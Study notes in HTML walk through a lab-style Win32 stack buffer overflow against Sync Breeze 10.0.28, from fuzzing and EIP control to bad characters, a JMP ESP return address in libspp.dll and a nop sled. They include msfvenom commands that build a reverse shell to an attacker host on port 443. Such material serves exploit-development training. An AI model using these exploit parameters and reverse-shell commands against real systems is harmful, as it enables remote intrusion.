<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Win32 buffer overflows</title>
</head><body>How to identify buffer overflows:<ul><li style="list-style-type: none">Source code review</li>
<li style="list-style-type: none">Fuzzing</li>
</ul>
Process of discovering and exploiting a buffer overflow vulnerability as an attacker:<ul><li style="list-style-type: none">Discover the buffer overflow vulnerability without access to the source code of the application</li>
<li style="list-style-type: none">Craft our input in such a way that it grants us control of critical CPU register</li>
<li style="list-style-type: none">Manipulate memrory to get reliable remote code execution</li>
</ul>
x86 architecture:<ul><li style="list-style-type: none">Windows process memory (lower to higher memory addresses):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">0c00000000</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">Stack</li>
<li style="list-style-type: none">Program Image</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">0x00400000&#09;&#09;Process Environment Block (PEB)</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">Thread Environment Block (TEB)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">0x7FFDF000&#09;&#09;Dynamic Link Library (DLL)</li>
<li style="list-style-type: none">0x7FFFFFFF</li>
<li style="list-style-type: none">0xFFFFFFFF &#09;&#09;Kernel Memory Space</li>
</ul>
</li>
<li style="list-style-type: none">We will only focus on the Stack.</li>
<li style="list-style-type: none">When a thread is running, it executes code from either the Progam Image or one or multiple DLLs loaded by the application, The thread requires a short term date area, for functions, local variables and program control information. This data area is known as the Stack. Each trhead in a running application has its own Stack. The Stack is seen by the CPU as a LIFO data structture. The x86 architecture implements specific PUSH and POP assembly instructions to add/remove data from the stack. </li>
<li style="list-style-type: none">Function return address is the address to return to when the function completes. This return address (together with the function's arguments and local variables) is stored on the Stack and associated with one function call and is store in a section of the Stack memory called Stack Frame.</li>
<li style="list-style-type: none">CPU registers: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">x86 CPUs have 9 32-bit registers (small and extreme high speed CPU storage locations)</li>
<li style="list-style-type: none">General Purpose Registers:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">EAX - the Accumulator</li>
<li style="list-style-type: none">EBX - the Base Pointer</li>
<li style="list-style-type: none">ECX - the Count register</li>
<li style="list-style-type: none">EDX - the I/O port addressing, multiplication and division register</li>
<li style="list-style-type: none">ESI - the Source Index (pointer to the data source in string copy operations)</li>
<li style="list-style-type: none">EDI - the Destination Index (pointer to the destination memory buffer in string copy operations)</li>
</ul>
</li>
<li style="list-style-type: none">ESP - the Stack Pointer (the most recently referenced location on the Stack)</li>
<li style="list-style-type: none">EBP - the Base Pointer (pointer to the top of the Stack when a function is called, so that a function can easily reference its own stack frame via offset while executing)</li>
<li style="list-style-type: none">EIP - the Instruction Pointer (is the most important register for our purposes, since it points to the next code instruction to be executed, which is the key piece of information to control when performing a buffer overflow)</li>
</ul>
</li>
</ul>
Win32 buffer overflow exploitation::<ul><li style="list-style-type: none">Fuzzing the HTTP protocol:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Sync Breeze 10.0.28 is vulnerable to pre-authentication buffer overflow using the username field</li>
<li style="list-style-type: none">First we will sample the network traffic generated by an unsuccessful login attempt on Sync Breeze Web interface with Wireshark &nbsp;</li>
<li style="list-style-type: none">We build a python fuzzer to send a series of HTTP POST login requests with increasingly longer username values</li>
<li style="list-style-type: none">Identify which Sync Breeze process is listening on TCP port 80 with Windows TCPView to attach Immunity Debugger to</li>
<li style="list-style-type: none">Run the python fuzzer and see that Sync Breeze crashes once the username lenght is around 800 bytes</li>
</ul>
</li>
<li style="list-style-type: none">Replicating the crash:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">With python fuzzer and fixed username buffer lenght (800 bytes)</li>
</ul>
</li>
<li style="list-style-type: none">Controlling EIP:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We need to identify which part of the buffer ends up ovewriting the 4 bytes of the EIP </li>
<li style="list-style-type: none">msf-patter_create -l 800</li>
<li style="list-style-type: none">We update the username buffer of the python fuzzer with the buffer generated with metasploit </li>
<li style="list-style-type: none">We run the fuzzer again and we find out that EIP has been overwritten with the 4 bytes 42306142 = B0aB</li>
<li style="list-style-type: none">msf-pattern_offset -l 800 -q 42306142</li>
<li style="list-style-type: none">We find that these 4 bytes are at lenght 780 of the username buffer</li>
<li style="list-style-type: none">We then update the python fuzzer to use a username buffer composed of 780 As, 4 Bs and 16 Cs (16 Cs to fill the original 800 bytes buffer lenght proven to crash Sync Breeze reliably)</li>
</ul>
</li>
<li style="list-style-type: none">Locating space for our shellcode:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">At this point we can control the EIP content, but first we need to identify to which address point the EIP (i.e. the address of our shellcode of choice)</li>
<li style="list-style-type: none">ESP seems a convenient location for our shellcode, but we need to increase our username buffer lenght (for example from 800 to 1500 bytes, as in 780 As, 4 Bs, 16 Cs and 700 Ds), since a reverse shell shellcode is usually 350 to 400 bytes in size</li>
<li style="list-style-type: none">We run the python fuzzer again and we find that this new username buffer gives us more than 700 bytes of free space for our shellcode</li>
</ul>
</li>
<li style="list-style-type: none">Checking for bad characters:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">These are characters that will make the shellcose </li>
<li style="list-style-type: none">An example is the null byte 0x00 (which is used to terminate a string in low level languages)</li>
<li style="list-style-type: none">Another often bad character is the rerutn character 0x0D, which signify the end of an HTTP field, in our case the username </li>
<li style="list-style-type: none">The most comon way to idenfy bad chars is to send all possible chars (from 0x00 to 0xFF) as part of our buffer to the application and see how these chars are handled by the application</li>
<li style="list-style-type: none">To do this, we change the username buffer of the python fuzzer accordingly (we populate the username buffer with a string containing ALL possible chars), we crash Sync Breeze and we "Follow in Dump" the ESP</li>
<li style="list-style-type: none">From the HEX dump we find that the character 0x0A is not present (0x0A is the Line Feed character, which also breaks HTML like a carriage return 0x0D), we remove it from the username buffer of the python fuzzer and we run it again</li>
<li style="list-style-type: none">At the next iteration, we find out that 0x0D is also bad, which was expected, knowing that 0x0D is a carriage return and breaks HTML</li>
<li style="list-style-type: none">Running the python fuzzer recursively and taking out one by one all the bad chars that we identify, we came to the conclusion that in our Sync Breeze scenario, all the following are bad chars: 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, 0x3D</li>
</ul>
</li>
<li style="list-style-type: none">Redirecting the execution flow (finding the return address):</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">The most intuitive approach is the replace the Bs (EIP) with the address of the ESP at the time of the crash, however we see that the ESP value is changing from crash to crash (since each thread has a different stack region in memory allocated by the operating system), thus overwriting the EIP with the ESP address is not a reliable solution</li>
<li style="list-style-type: none">The solution is to use the JMP ESP instruction (or its memory address), which is a way to dynamically and reliably point the execution flow (the EIP) to the ESP address, thus our shellcode</li>
<li style="list-style-type: none">We need to find a reliable and static JMP ESP instruction. JMP ESP is a very common instruction, found in several Windows libraries. However, we cannot use libraries compiled with ASLR support, since in these the memory addresses are not static</li>
<li style="list-style-type: none">Also, we need to find a JMP ESP instruction not only static, but whose address does not contain any of the bad chars identified prior</li>
<li style="list-style-type: none">We use the Immunity Debugger mona modules (!mona modules) to navigate all the libraries (DLLs) used by the Sync Breeze executable</li>
<li style="list-style-type: none">We find that the Sync Breeze executable has all the memory protection schemes disabled (which is good), but its address is 00400000, which are all bad chars (thus not good). We need to look further</li>
<li style="list-style-type: none">Searching further, we find that libspp.dll suits our needs in terms of memory protection not used and address with no bad chars in it</li>
<li style="list-style-type: none">Now we need to find a naturally occurring JMP ESP instruction within the libspp.dll. We can perform this search with !mona find</li>
<li style="list-style-type: none">To find the opcode of a JMP ESP instruction, we can use the msf-nasm_shell and type "jmp esp" once in the nasm shell. We find that the opcode for JMP ESP is FFE4</li>
<li style="list-style-type: none">We can now search for a JMP ESP instruction within libspp.dll with the !mona find command and passing the HEX representation of the JMP ESP opcode: !mona find -s "\xff\xe4" -m "libspp.dll". This command gives us the result of the 0x10090c83 address for a JMP ESP instruction in libspp.dll and, fortunately, this address does not contain any of the bad chars for Sync Breeze. This is our "return address"</li>
<li style="list-style-type: none">We update the python fuzzer with the return address just found in place of the 4 Bs (but in reverse order "\x83\x0c\x09\x10", due to the Little Endian byte order of Win32 systems, where the low order byte of the number is stored in memory at the lowest address and the high order byte is stored at the highest memory address, thus the reverse order of the return address for the CPU to interpret it correctly)</li>
</ul>
</li>
<li style="list-style-type: none">Generating shellcode with metaploit:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c </li>
<li style="list-style-type: none">This command gives us a shellcode that contains bad chars. We need then to encode the shellcode and instruct msfvenom not to use any of the bad chars</li>
<li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" </li>
</ul>
</li>
<li style="list-style-type: none">Getting a shell:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">We add the generated shellcode to our username buffer in the python fuzzer after the filler, EIP and offset</li>
<li style="list-style-type: none">However, because the shellcode is encoded, it is not directly executable and is pre-pended by a decoder stub</li>
<li style="list-style-type: none">The job of the stub is to iterate over the encoded shellcode bytes and decode them back to their original executable format</li>
<li style="list-style-type: none">In order to perform this task the decoder needs to gather its address in &nbsp; &nbsp;memory and from there look at few bytes ahead to locate the encoded shellcode that it needs to decode</li>
<li style="list-style-type: none">As part of the process of gathering the decoder stub location in memory, the code performs a sequence of assemby instructions, which are commonly referred to as a GetPC routine. This is a short routine that moves the value of the EIP register (sometimes referred to as the Program Counter, or PC) into another register. As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side effect of writing some data at and around the top of the Stack. This eventually mangles at least a couple of bytes close to the address pointed to by the ESP register, which leads to an access violation caused by the decoder (the GetPC routine corrupts the decoder, which fails to decode the shellcode and the shellcode triggers the access violation)</li>
<li style="list-style-type: none">To prevent this problem to occur, we can create a wide landing pad to our JMP ESP, such that when execution lands anywhere on this pad, it will continue on to our payload. We simply precede our payload with a series of "no operation" or nop instructions ("\x90"), which do nothing else than pass execution to the next instruction. These instructions are known as "nop sled" or "nop slide"</li>
<li style="list-style-type: none">We add 10 nops immediately before our shellcode in the python fuzzer (the username buffer will then be as follows: buffer = filler + eip + offset + nops + shellcode) &nbsp;</li>
<li style="list-style-type: none">Now the exploit is working as expected and a reverse shell is sent to the attacker machine on port 443</li>
<li style="list-style-type: none">However the exploit crashes Sync Breeze once the attacker closes the reverse shell. We can try to avoid the crash using the ExitThread api, instead of the ExitProcess api used by the metasploit reverse shell. This will alow us to run the exploit without interrupting the norml operations of the Sync Breeze server</li>
<li style="list-style-type: none">To instruct msfvenom to use the ExitThread function instead of the ExitProcess, we can use the following syntax: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" </li>
<li style="list-style-type: none">Let"s replace the shellcode and verify that exiting the reverse shell will not crash Sync Breeze. BINGO!</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
</li>
</ul>
</body></html>